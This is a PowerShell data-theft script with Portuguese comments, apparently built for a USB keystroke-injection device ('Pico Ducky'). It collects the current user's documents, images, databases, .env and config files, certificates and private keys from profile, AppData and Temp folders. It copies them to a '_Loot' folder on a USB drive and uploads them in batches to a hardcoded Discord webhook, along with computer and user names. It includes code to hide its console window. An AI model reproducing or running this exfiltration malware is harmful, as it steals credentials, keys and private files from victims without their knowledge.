<#
.SYNOPSIS
    Coleta arquivos de um computador e envia para um webhook do Discord.
.DESCRIPTION
    Aguarda a conexão de um USB, coleta arquivos de pastas do usuário atual
    (incluindo Temp, AppData\Local, AppData\Roaming), limita a 10 arquivos
    por lote e 8MB por arquivo, e envia para o Discord.
    Envia mensagens de status no início e no final da execução.
.NOTES
    Autor: Adaptado para Pico Ducky
    Limites: 10 arquivos/lote, 8MB/arquivo
#>

# ============= CONFIGURAÇÃO =============
$webhookUrl = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"  # <-- SUBSTITUA PELO SEU WEBHOOK
$maxFilesPerBatch = 10
$maxFileSizeMB = 8
$maxFileSizeBytes = $maxFileSizeMB * 1MB

# ============= FUNÇÕES =============
function Send-DiscordMessage {
    param(
        [string]$Message,
        [string]$WebhookUrl
    )
    
    try {
        $body = @{ content = $Message } | ConvertTo-Json
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
        return $true
    }
    catch {
        Write-Host "Erro ao enviar mensagem para o Discord: $_" -ForegroundColor Red
        return $false
    }
}

function Send-FilesToDiscord {
    param(
        [string]$FolderPath,
        [string]$WebhookUrl,
        [int]$MaxFiles = 10,
        [int]$MaxSizeBytes = 8MB
    )
    
    $files = Get-ChildItem -Path $FolderPath -File | Where-Object { $_.Length -le $MaxSizeBytes }
    
    if ($files.Count -eq 0) {
        Write-Host "Nenhum arquivo válido para enviar (tamanho <= 8MB)." -ForegroundColor Yellow
        return @{sent = 0; skipped = 0}
    }
    
    Write-Host "Encontrados $($files.Count) arquivos para envio." -ForegroundColor Cyan
    
    $sentCount = 0
    $skippedCount = 0
    $batchNumber = 1
    $fileIndex = 0
    
    # Processa em lotes de até $MaxFiles
    while ($fileIndex -lt $files.Count) {
        $batch = $files | Select-Object -Skip $fileIndex -First $MaxFiles
        $fileIndex += $MaxFiles
        
        Write-Host "Enviando lote $batchNumber ($($batch.Count) arquivos)..." -ForegroundColor Magenta
        
        # Prepara a mensagem com a lista de arquivos do lote
        $fileList = ($batch | ForEach-Object { "- $($_.Name) ($([math]::Round($_.Length / 1KB, 1)) KB)" }) -join "`n"
        
        $headerMessage = @{
            content = "📦 **Lote $batchNumber**`n📁 Pasta: $FolderPath`n📄 Arquivos neste lote:`n$fileList"
        } | ConvertTo-Json
        
        try {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $headerMessage -ContentType 'application/json'
            Start-Sleep -Milliseconds 300
        }
        catch {
            Write-Host "Erro ao enviar cabeçalho do lote: $_" -ForegroundColor Red
        }
        
        # Envia cada arquivo do lote
        foreach ($file in $batch) {
            try {
                # Verifica novamente o tamanho (segurança)
                if ($file.Length -gt $MaxSizeBytes) {
                    Write-Host "Arquivo muito grande: $($file.Name) - Pulando..." -ForegroundColor Yellow
                    $skippedCount++
                    continue
                }
                
                # Se for um arquivo de texto pequeno, envia como mensagem
                if ($file.Length -lt 2000 -and ($file.Extension -in '.txt','.log','.json','.cfg','.conf','.xml','.ini','.yaml','.config','.env','.csv','.forms')) {
                    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        # Limita o conteúdo a 1900 caracteres
                        $truncatedContent = if ($content.Length -gt 1900) {
                            $content.Substring(0, 1900) + "... [truncado]"
                        } else {
                            $content
                        }
                        
                        $body = @{
                            content = "**📄 $($file.Name)**`n```$truncatedContent```"
                        } | ConvertTo-Json
                        
                        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
                        Write-Host "Enviado (texto): $($file.Name)" -ForegroundColor Green
                        $sentCount++
                        Start-Sleep -Milliseconds 200
                        continue
                    }
                }
                
                # Para arquivos maiores ou binários, envia como anexo
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                
                $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
                
                # CORRIGIDO: Uso de string com aspas duplas e variáveis dentro
                $fileSizeKB = [math]::Round($file.Length / 1KB, 1)
                $contentText = "📎 $($file.Name) ($fileSizeKB KB)"
                
                $bodyLines = @(
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"payload_json`"$LF",
                    "{`"content`": `"$contentText`"}",
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
                    "Content-Type: application/octet-stream$LF",
                    $fileContent,
                    "--$boundary--$LF"
                ) -join $LF
                
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
                Write-Host "Enviado (anexo): $($file.Name)" -ForegroundColor Green
                $sentCount++
                Start-Sleep -Milliseconds 500
            }
            catch {
                Write-Host "Erro ao enviar $($file.Name): $_" -ForegroundColor Red
                $skippedCount++
            }
        }
        
        $batchNumber++
        
        # Pausa maior entre lotes
        if ($fileIndex -lt $files.Count) {
            Write-Host "Aguardando 2 segundos antes do próximo lote..." -ForegroundColor Gray
            Start-Sleep -Seconds 2
        }
    }
    
    return @{
        sent = $sentCount
        skipped = $skippedCount
        total = $files.Count
    }
}

# ============= CORPO PRINCIPAL DO SCRIPT =============
Clear-Host

# --- Passo 0: Enviar mensagem de INÍCIO ---
Write-Host "Enviando mensagem de início para o Discord..." -ForegroundColor Cyan
$startMessage = "🚀 **Sistema Iniciado**`n" +
                "⏰ Data/Hora: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`n" +
                "💻 Computador: $env:COMPUTERNAME`n" +
                "👤 Usuário: $env:USERNAME`n" +
                "🔗 Aguardando USB para coleta..."

$webhookOk = Send-DiscordMessage -Message $startMessage -WebhookUrl $webhookUrl

if (-not $webhookOk) {
    Write-Host "⚠️ Não foi possível enviar mensagem de início. Verifique o webhook." -ForegroundColor Yellow
}

# --- Passo 1: Aguardar o USB ---
$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
$count = $removableDrives.count
$i = 30

Write-Host "Aguardando dispositivo USB... (30s timeout)" -ForegroundColor Yellow

# Envia mensagem de espera para o Discord
if ($webhookOk) {
    $waitingMessage = "⏳ Aguardando conexão de USB... (30 segundos)"
    Send-DiscordMessage -Message $waitingMessage -WebhookUrl $webhookUrl | Out-Null
}

while ($true) {
    Clear-Host
    Write-Host "Conecte um dispositivo USB.. ($i segundos restantes)" -ForegroundColor Yellow
    $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    Start-Sleep 1
    
    if ($count -ne $removableDrives.count) {
        Write-Host "USB conectado!" -ForegroundColor Green
        
        # Envia mensagem de USB conectado
        if ($webhookOk) {
            $usbMessage = "💾 **USB Conectado!**`n" +
                          "📂 Iniciando coleta de arquivos..."
            Send-DiscordMessage -Message $usbMessage -WebhookUrl $webhookUrl | Out-Null
        }
        break
    }
    
    $i--
    if ($i -eq 0) {
        Write-Host "Tempo esgotado! Saindo..." -ForegroundColor Red
        
        # Envia mensagem de timeout
        if ($webhookOk) {
            $timeoutMessage = "⏰ **Timeout!**`n" +
                              "Nenhum USB conectado em 30 segundos.`n" +
                              "Script encerrado."
            Send-DiscordMessage -Message $timeoutMessage -WebhookUrl $webhookUrl | Out-Null
        }
        Start-Sleep 2
        exit
    }
}

# --- Passo 2: Detectar o drive e criar pasta ---
$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
$driveLetter = $drive.DeviceID
Write-Host "Drive de destino: $driveLetter/" -ForegroundColor Green

# ============= NOVAS EXTENSÕES =============
$fileExtensions = @(
    # Extensões originais
    "*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", 
    "*.jpg", "*.jpeg", "*.png", "*.cer", "*.key", "*.xls", 
    "*.xlsx", "*.cfg", "*.conf",
    # Novas extensões de documentos
    "*.docx", "*.pptx", "*.ppt", "*.ppsx", "*.pptm", "*.potx",
    # Arquivos de configuração e código
    "*.env", "*.yaml", "*.config", "*.csv", "*.forms",
    # Certificados e chaves
    "*.pem", "*.crt", "*.pkcs12", "*.pfx"
)

# ============= NOVAS PASTAS (APENAS USUÁRIO ATUAL) =============
$foldersToSearch = @(
    # Pastas originais
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop", 
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\OneDrive",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Videos",
    # NOVAS PASTAS
    "$env:USERPROFILE\AppData\Local",
    "$env:USERPROFILE\AppData\Roaming",
    "$env:USERPROFILE\AppData\Local\Temp",
    "$env:TEMP"  # Caminho alternativo para Temp
)

# Remove pastas que não existem
$foldersToSearch = $foldersToSearch | Where-Object { Test-Path $_ }

Write-Host "Pastas a serem pesquisadas:" -ForegroundColor Cyan
foreach ($folder in $foldersToSearch) {
    Write-Host "  - $folder" -ForegroundColor Gray
}

$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath -Force | Out-Null
    Write-Host "Pasta criada: $destinationPath" -ForegroundColor Green
}

# ============= 3: OCULTAÇÃO DA JANELA =============
function Hide-Window {
    Write-Host "Ocultando a janela..." -ForegroundColor Yellow
    Start-Sleep 1
    
    try {
        # Código original do HidePS (copiado do Pastebin)
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0)
            Write-Host "Janela ocultada com sucesso (via PID)." -ForegroundColor Green
        }
        else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
            Write-Host "Janela ocultada com sucesso (via título)." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Não foi possível ocultar a janela: $_" -ForegroundColor Red
    }
}
# --- Passo 4: Coletar os arquivos (limitando a 8MB) ---
$driveIndex = 0
$collectedFiles = @()
$skippedLargeFiles = 0
$totalFilesFound = 0

Write-Host "Coletando arquivos (máx. 8MB por arquivo)..." -ForegroundColor Cyan

foreach ($folder in $foldersToSearch) {
    if (-not (Test-Path $folder)) { continue }
    
    Write-Host "Procurando em: $folder" -ForegroundColor Gray
    
    foreach ($extension in $fileExtensions) {
        try {
            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
            
            foreach ($file in $files) {
                $totalFilesFound++
                
                # Verifica tamanho do arquivo (máx. 8MB)
                if ($file.Length -gt $maxFileSizeBytes) {
                    Write-Host "Arquivo ignorado (>8MB): $($file.Name) ($([math]::Round($file.Length / 1MB, 1)) MB)" -ForegroundColor Yellow
                    $skippedLargeFiles++
                    continue
                }
                
                $driveIndex++
                
                # Verifica se o USB ainda está conectado a cada 30 arquivos
                if ($driveIndex -gt 30) {
                    $drive = Get-Volume -DriveLetter $driveLetter.trimEnd(":")
                    if (-not $drive) {
                        Write-Host "USB desconectado! Encerrando..." -ForegroundColor Red
                        
                        # Envia mensagem de USB desconectado
                        if ($webhookOk) {
                            $disconnectMessage = "⚠️ **USB Desconectado!**`n" +
                                                 "Script interrompido antes da conclusão."
                            Send-DiscordMessage -Message $disconnectMessage -WebhookUrl $webhookUrl | Out-Null
                        }
                        exit
                    }
                    $driveIndex = 0
                }
                
                # Copia para o USB
                $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
                
                # Se o arquivo já existe, adiciona um número ao nome
                if (Test-Path $destinationFile) {
                    $baseName = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
                    $extension2 = [System.IO.Path]::GetExtension($file.Name)
                    $counter = 1
                    do {
                        $newName = "$baseName`_$counter$extension2"
                        $destinationFile = Join-Path -Path $destinationPath -ChildPath $newName
                        $counter++
                    } while (Test-Path $destinationFile)
                }
                
                Copy-Item -Path $file.FullName -Destination $destinationFile -Force -ErrorAction SilentlyContinue
                $collectedFiles += $destinationFile
            }
        }
        catch {
            Write-Host "Erro ao acessar $folder : $_" -ForegroundColor Red
        }
    }
}

Write-Host "`nResumo da coleta:" -ForegroundColor Cyan
Write-Host "  Total de arquivos encontrados: $totalFilesFound" -ForegroundColor White
Write-Host "  Arquivos coletados (<=8MB): $($collectedFiles.Count)" -ForegroundColor Green
if ($skippedLargeFiles -gt 0) {
    Write-Host "  Arquivos ignorados (>8MB): $skippedLargeFiles" -ForegroundColor Yellow
}

# --- Passo 5: Enviar para o Discord (em lotes de 10) ---
if ($collectedFiles.Count -gt 0 -and $webhookUrl -ne "SEU_WEBHOOK_URL_AQUI") {
    Write-Host "`nEnviando para o Discord (máx. $maxFilesPerBatch arquivos por lote)..." -ForegroundColor Cyan
    
    $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
    
    # Mensagem de confirmação final
    $summaryMessage = "✅ **Coleta concluída!**`n" +
                      "📁 Pasta: $destinationPath`n" +
                      "📄 Total encontrado: $totalFilesFound`n" +
                      "📄 Coletados: $($collectedFiles.Count)`n" +
                      "📤 Enviados: $($result.sent)`n" +
                      "⏭️ Ignorados (>8MB): $($result.skipped + $skippedLargeFiles)`n" +
                      "💻 Computador: $env:COMPUTERNAME`n" +
                      "👤 Usuário: $env:USERNAME`n" +
                      "⏰ Finalizado em: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
    
    Send-DiscordMessage -Message $summaryMessage -WebhookUrl $webhookUrl
    
    # --- Passo 6: Enviar mensagem de FINALIZADO ---
    $endMessage = "🏁 **Sistema Finalizado**`n" +
                  "✅ Todas as operações concluídas com sucesso.`n" +
                  "⏰ Data/Hora: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`n" +
                  "📦 Total de lotes enviados: $([math]::Ceiling($collectedFiles.Count / $maxFilesPerBatch))"
    
    Send-DiscordMessage -Message $endMessage -WebhookUrl $webhookUrl
}
else {
    if ($webhookUrl -eq "SEU_WEBHOOK_URL_AQUI") {
        Write-Host "`nWebhook não configurado! Arquivos salvos em: $destinationPath" -ForegroundColor Red
        
        # Envia mensagem de erro (webhook não configurado)
        $errorMessage = "❌ **Erro de Configuração**`n" +
                        "Webhook não configurado.`n" +
                        "Arquivos salvos localmente em: $destinationPath"
        Send-DiscordMessage -Message $errorMessage -WebhookUrl $webhookUrl
    } else {
        Write-Host "`nNenhum arquivo coletado." -ForegroundColor Yellow
        
        # Envia mensagem de nenhum arquivo encontrado
        $noFilesMessage = "📭 **Nenhum Arquivo Encontrado**`n" +
                          "O script não encontrou arquivos com as extensões especificadas.`n" +
                          "💻 Computador: $env:COMPUTERNAME`n" +
                          "👤 Usuário: $env:USERNAME"
        Send-DiscordMessage -Message $noFilesMessage -WebhookUrl $webhookUrl
    }
}

Write-Host "`nScript finalizado!" -ForegroundColor Green
Start-Sleep 2
